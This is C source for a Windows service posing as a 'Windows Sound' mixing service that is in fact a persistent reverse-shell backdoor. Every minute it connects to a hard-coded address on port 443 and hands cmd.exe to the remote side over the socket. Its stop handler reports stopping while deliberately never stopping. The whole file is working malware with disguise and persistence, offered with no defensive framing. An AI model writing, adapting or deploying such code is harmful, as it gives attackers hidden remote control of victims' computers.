#include <winsock2.h>
#include <tchar.h>
#include <windows.h>

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
DWORD WINAPI HandlerEx(DWORD control, DWORD eventType, void *eventData, void *context);
void ReportStatus(DWORD state);

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define DEFAULT_PORT 443
#define DEFAULT_IP "192.168.1.216"
#define SERVICE_NAME _T("Windows Sound")

// Service stuff
SERVICE_STATUS_HANDLE g_ServiceStatusHandle; 
HANDLE g_StopEvent;
DWORD g_CurrentState = 0;
bool g_SystemShutdown = false;
// Socket stuff
WSADATA wsaData;
SOCKET Winsocket;
STARTUPINFO theProcess; 
PROCESS_INFORMATION info_proc; 
struct sockaddr_in Winsocket_Structure;
 
int main(int argc, char **argv)
{
    SERVICE_TABLE_ENTRY serviceTable[] = {
        { SERVICE_NAME, &ServiceMain },
        { NULL, NULL }
    };

	SC_HANDLE schSCManager;
	SC_HANDLE schService;
	SERVICE_DESCRIPTION sd;

	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	schService = OpenService(schSCManager, SERVICE_NAME, SERVICE_CHANGE_CONFIG);
	sd.lpDescription = TEXT("Provides sound and mixing services to Microsoft programs");

	ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &sd); // Assign service description

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
        
    if (StartServiceCtrlDispatcher(serviceTable))
        return 0;
    else if (GetLastError() == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
        return -1; // Program not started as a service.
    else
        return -2; // Other error.
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    // Must be called at start.
    g_ServiceStatusHandle = RegisterServiceCtrlHandlerEx(SERVICE_NAME, &HandlerEx, NULL);
    ReportStatus(SERVICE_START_PENDING);
    g_StopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    ReportStatus(SERVICE_RUNNING);

	char *IP =  DEFAULT_IP;
    short port = DEFAULT_PORT; 
    while (WaitForSingleObject(g_StopEvent, 3000) != WAIT_OBJECT_0)
    {
        WSAStartup(MAKEWORD(2,2), &wsaData);
		Winsocket=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL, (unsigned int) NULL, (unsigned int) NULL);
		Winsocket_Structure.sin_port=htons(port);
		Winsocket_Structure.sin_family=AF_INET;
		Winsocket_Structure.sin_addr.s_addr=inet_addr(IP);

		if(Winsocket==INVALID_SOCKET)
		{
			WSACleanup();
		}

		if(WSAConnect(Winsocket,(SOCKADDR*)&Winsocket_Structure,sizeof(Winsocket_Structure),NULL,NULL,NULL,NULL) == SOCKET_ERROR)
		{
			WSACleanup();
		}

		// Starting shell by creating a new process with i/o redirection.    
		memset(&theProcess,0,sizeof(theProcess));
		theProcess.cb=sizeof(theProcess);
		theProcess.dwFlags=STARTF_USESTDHANDLES;
		theProcess.hStdInput = theProcess.hStdOutput = theProcess.hStdError = (HANDLE)Winsocket;

		// fork the new process.
		if(CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&theProcess,&info_proc)==0)
		{
			WSACleanup();
		}
		
		Sleep(60000); // 1 minute
    }

    ReportStatus(SERVICE_STOP_PENDING);
    CloseHandle(g_StopEvent);
    ReportStatus(SERVICE_STOPPED);
}

DWORD WINAPI HandlerEx(DWORD control, DWORD eventType, void *eventData, void *context)
{
    switch (control)
    {
    // Entrie system is shutting down.
    case SERVICE_CONTROL_SHUTDOWN:
        g_SystemShutdown = true;
        // continue...
    // Service is being stopped.
    case SERVICE_CONTROL_STOP:
        ReportStatus(SERVICE_STOP_PENDING); // Never stop the service, but say we are..
        //SetEvent(g_StopEvent); 
        break;
    // Ignoring all other events, but we must always report service status.
    default:
        ReportStatus(g_CurrentState);
        break;
    }
    return NO_ERROR;
}

void ReportStatus(DWORD state)
{
    g_CurrentState = state;
    SERVICE_STATUS serviceStatus = {
        SERVICE_WIN32_OWN_PROCESS,
        g_CurrentState,
        state == SERVICE_START_PENDING ? 0 : SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN,
        NO_ERROR,
        0,
        0,
        0,
    };
    SetServiceStatus(g_ServiceStatusHandle, &serviceStatus);
}

